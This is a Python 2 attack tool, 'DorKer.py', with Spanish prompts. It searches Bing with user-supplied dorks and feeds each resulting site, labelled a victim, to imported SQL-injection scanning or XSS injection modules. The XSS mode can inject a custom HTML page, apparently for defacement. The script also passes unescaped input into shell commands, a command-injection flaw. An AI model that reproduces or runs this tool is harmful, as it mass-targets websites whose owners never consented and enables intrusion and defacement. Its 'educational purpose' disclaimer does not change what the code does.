#!/usr/bin/python
# This was written for educational purpose and pentest only. Use it at your own risk.
# Author will be not responsible for any damage!
# 
# Toolname        : DorKer.py
# Coder           : Sandman
# Version         : 1.0
#  

import re 
import urllib2
from Modulos import sqlscann
from Modulos import xsser
from Modulos import coder
import commands
import os
import csv
import sys
import subprocess
from colorama import *

def logo():
	print Fore.RED+"________                ____  __.            "
	print "\______ \   ___________|    |/ _|___________ "
	print " |    |  \ /  _ \_  __ \      <_/ __ \_  __ \ "
	print " |    `   (  <_> )  | \/    |  \  ___/|  | \/"
	print "/_______  /\____/|__|  |____|__ \___  >__|   "
	print "        \/                     \/   \/       "
	print "              By: Sandman"
	print "Correo y Xmpp: sandman95@cock.li twitter: @Sandman__95"

def clean():

	if sys.platform == "linux" or sys.platform == "linux2":
		subprocess.call(["clear"], shell=True)

	else:
		subprocess.call(["cls"], shell=True)
		
def sqli():
	clean()
	logo()
	print """
    [1] Ingresar Dork
    [2] Utilizar txt con diferentes dorks
	"""
	while True:
		respuesta = raw_input("=>:  ")
		if respuesta == "1":
			print Fore.WHITE+"DorKer"
			print ""
			impr = raw_input("Te Gustaria guardar las URL's en un Documento? Y/n  ")
			dork = raw_input("Dork: ")
			if " " in dork:
				dork=dork.replace(" ", "+")

			def finder(dork):
				first = 1
				while first<=500:
					response = urllib2.urlopen("http://www.bing.com/search?q={}&first={}".format(dork, first))
					payload = response.read()
					results = re.findall('<h2><a(.*?)h="', payload)
					for result in results:
						result = result.lstrip(" href=")
						result = result.lstrip('"')
						result = result.rstrip('" ')
						vict = result
						sqlscann.scan(vict)
						first = first + 10
			def printer(dork):
				first = 1
				while first<=500:
					response = urllib2.urlopen("http://www.bing.com/search?q={}&first={}".format(dork, first))
					payload = response.read()
					results = re.findall('<h2><a(.*?)h="', payload)
					for result in results:
						result = result.lstrip(" href=")
						result = result.lstrip('"')
						result = result.rstrip('" ')
						vict = result
						sqlscann.iprim(vict)
						first = first + 10
			if impr == "y" or impr == "Y" or impr == "":
				printer(dork)
			elif impr == "N" or impr == "n": 
				finder(dork)
			print ""
			print "Listo"
			sys.exit(0)
		
		elif respuesta == "2":
			print Fore.WHITE+"Dorker"
			print ""
			impr = raw_input("Te Gustaria guardar las URL's en un Documento? Y/n  ")
			print "Introduce la ruta de tus dorks"
			print "ex. /home/user/dorks.txt"
			
			dork = raw_input("=>:  ")
			lista = commands.getoutput("cat "+dork)
			os.system("echo '"+lista+"' > Dorks.txt")
			dorklist = open("Dorks.txt","r")
			reader = csv.reader(dorklist)
			lista = [row for row in reader]
			nl = 0
			dork = str(lista [nl])
			i = 1
			while True:
				
				if "['" in dork:
					dork=dork.replace("['", "")
					dork=dork.replace("']","")
				if " " in dork:
					dork=dork.replace(" ", "+")

				def finder(dork):
					print (Fore.YELLOW+"Buscando el Dork "+dork)
					first = 1
					while first<=500:
						response = urllib2.urlopen("http://www.bing.com/search?q={}&first={}".format(dork, first))
						payload = response.read()
						results = re.findall('<h2><a(.*?)h="', payload)
						for result in results:
							result = result.lstrip(" href=")
							result = result.lstrip('"')
							result = result.rstrip('" ')
							vict = result
							sqlscann.scan(vict)
							first = first + 10
				def printer(dork):
					print (Fore.YELLOW+"Buscando el Dork "+dork)
					first = 1
					while first<=500:
						response = urllib2.urlopen("http://www.bing.com/search?q={}&first={}".format(dork, first))
						payload = response.read()
						results = re.findall('<h2><a(.*?)h="', payload)
						for result in results:
							result = result.lstrip(" href=")
							result = result.lstrip('"')
							result = result.rstrip('" ')
							vict = result
							sqlscann.iprim(vict)
							first = first + 10
				if impr == "y" or impr == "Y" or impr == "":
					printer(dork)
				elif impr == "N" or impr == "n": 
					finder(dork)
				nl = nl + 1
				i = i + 1
				if i <= len(lista):
					dork = str(lista [nl])
				elif i > len(lista):
					print ""
					print "Todos Los Dorks Escaneados..."
					os.system("rm Dorks.txt")
					sys.exit(0)
					
def XSS():
	clean()
	logo()
	print """
    [1] Ingresar Dork
    [2] Utilizar txt con diferentes dorks
	"""
	while True:
		respuesta = raw_input("=>:  ")
		if respuesta == "1":
			print Fore.WHITE+"XSSeR"
			print ""
			impr = raw_input("Te Gustaria guardar las URL's en un Documento? Y/n  ")
			dork = raw_input("Dork: ")
			clean()
			logo()
			print ("Usar Index Propia?")
			print ""
			print ("[Y]es [D]efault")
			indxrut = raw_input("=>  ")
			
			if indxrut == "D" or indxrut == "d" or indxrut == "":
				index = "%3Ch1%3EXSSeR%3C%2Fh1%3E"
				index2 = "<h1>XSSeR</h1>"
			
			elif indxrut == "Y" or indxrut == "y":	
				print "Por favor introdusca la ruta de su index"
				print ("")
				print ("Ex. /home/user/Documentos/index.html")
				print ("")
				index = raw_input("=>  ")
				index2 = commands.getoutput("cat "+index)
				coder.coder(index2)
				index = commands.getoutput("cat indexcodeada")
			print(index)
			if " " in dork:
				dork=dork.replace(" ", "+")

			def finder(dork,index):
				first = 1
				while first<=500	:
					response = urllib2.urlopen("http://www.bing.com/search?q={}&first={}".format(dork, first))
					payload = response.read()
					results = re.findall('<h2><a(.*?)h="', payload)
					for result in results:
						result = result.lstrip(" href=")
						result = result.lstrip('"')
						result = result.rstrip('" ')
						vict = result
						xsser.xsscan(vict,index,index2)
						first = first + 10
			def printer(dork,index):
				first = 1
				while first<=500:
					response = urllib2.urlopen("http://www.bing.com/search?q={}&first={}".format(dork, first))
					payload = response.read()
					results = re.findall('<h2><a(.*?)h="', payload)
					for result in results:
						result = result.lstrip(" href=")
						result = result.lstrip('"')
						result = result.rstrip('" ')
						vict = result
						xsser.xssimpr(vict,index,index2)
						first = first + 10
			if impr == "y" or impr == "Y" or impr == "":
				printer(dork,index)
			elif impr == "N" or impr == "n": 
				finder(dork,index)
			print ""
			print "Listo"
			sys.exit(0)
		
		elif respuesta == "2":
			print Fore.WHITE+"XSSeR"
			print ""
			impr = raw_input("Te Gustaria guardar las URL's en un Documento? Y/n  ")
			print "Introduce la ruta de tus dorks"
			print "ex. /home/user/dorks.txt"
			
			dork = raw_input("=>:  ")
			lista = commands.getoutput("cat "+dork)
			os.system("echo '"+lista+"' > Dorks.txt")
			dorklist = open("Dorks.txt","r")
			reader = csv.reader(dorklist)
			lista = [row for row in reader]
			nl = 0
			dork = str(lista [nl])
			i = 1
			clean()
			logo()
			print ("Usar Index Propia?")
			print ""
			print ("[Y]es [D]efault")
			indxrut = raw_input("=>  ")
			
			if indxrut == "D" or indxrut == "d" or indxrut == "":
				index = "%3Ch1%3EXSSeR%3C%2Fh1%3E"
				index2 = "<h1>XSSeR</h1>"
				
			elif indxrut == "Y" or indxrut == "y":
				print "Por favor introdusca la ruta de su index"
				print ("")
				print ("Ex. /home/user/Documentos/index.html")
				print ("")
				index2 = raw_input("=>  ")
				index = commands.getoutput("cat "+index)
				coder.coder(index)
				index = commands.getoutput("cat indexcodeada")
			print(index)
			while True:
				
				if "['" in dork:
					dork=dork.replace("['", "")
					dork=dork.replace("']","")
				if " " in dork:
					dork=dork.replace(" ", "+")

				def finder(dork,index):
					print (Fore.YELLOW+"Buscando el Dork "+dork)
					first = 1
					while first<=500:
						response = urllib2.urlopen("http://www.bing.com/search?q={}&first={}".format(dork, first))
						payload = response.read()
						results = re.findall('<h2><a(.*?)h="', payload)
						for result in results:
							result = result.lstrip(" href=")
							result = result.lstrip('"')
							result = result.rstrip('" ')
							vict = result
							xsser.xsscan(vict,index,index2)
							first = first + 10
				def printer(dork,index):
					print (Fore.YELLOW+"Buscando el Dork "+dork)
					first = 1
					while first<=500:
						response = urllib2.urlopen("http://www.bing.com/search?q={}&first={}".format(dork, first))
						payload = response.read()
						results = re.findall('<h2><a(.*?)h="', payload)
						for result in results:
							result = result.lstrip(" href=")
							result = result.lstrip('"')
							result = result.rstrip('" ')
							vict = result
							xsser.xssimpr(vict,index,index2)
							first = first + 10
				if impr == "y" or impr == "Y" or impr == "":
					printer(dork,index)
				elif impr == "N" or impr == "n": 
					finder(dork,index)
				nl = nl + 1
				i = i + 1
				if i <= len(lista):
					dork = str(lista [nl])
				elif i > len(lista):
					print ""
					print "Todos Los Dorks Escaneados..."
					os.system("rm Dorks.txt")
					sys.exit(0)
		
clean()			
logo()
print("Que Tipo de Escaneo Buscas")
print ("")
print """
    [1] SQLi
    [2] XSS
"""
escaneo = raw_input("=>  ")
	
if escaneo == "1":
	sqli()
	
elif escaneo == "2":
	XSS()
			
